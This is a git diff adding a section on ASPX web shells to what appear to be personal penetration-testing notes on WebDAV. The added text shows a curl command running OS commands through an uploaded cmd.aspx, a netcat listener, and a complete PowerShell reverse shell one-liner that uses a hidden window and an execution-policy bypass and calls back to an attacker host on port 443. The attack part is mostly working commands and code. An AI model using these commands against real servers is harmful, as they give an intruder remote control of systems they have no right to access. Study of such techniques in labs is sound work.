@@ -241,3 +241,44 @@ Anonymous users can only read "GET", other operations require valid identity.
 --ntlm flag is for curl to know which protocol to use.
 
 Success message is usually 201 Created. Means that file written to server.
+
+## ASPX Web Shells
+
+What is the aspx web shell?
+
+ASPX web shells are ASP.NET file that run on the web server and accetps the attacker http requests and executes them as server processes.
+
+the Application Pool ---> determines the priviliges and what shell could do.
+
+### Execute command with shell
+
+Using cmd.aspx the attacker can execute command within /webdav/ directory
+
+command example:
+
+`curl "http://TARGET_IP/webdav/cmd.aspx?cmd=whoami"`
+
+### Escalate to a reverse shell
+
+for more interactive access use rever shell.
+
+First run netcat from your machine:
+
+`nc -lvnp 443`
+
+443 over 4444 because it is almost never blocked
+
+Then powershell script must be used.
+
+`powershell -NoP -NonI -W Hidden -Exec Bypass -c`
+"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);`
+$stream = $client.GetStream();`
+[byte[]]$bytes = 0..65535|%{0};`
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){`
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);`
+$sendback = (iex $data 2>&1 | Out-String );`
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
+$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`
+$client.Close()""
+`
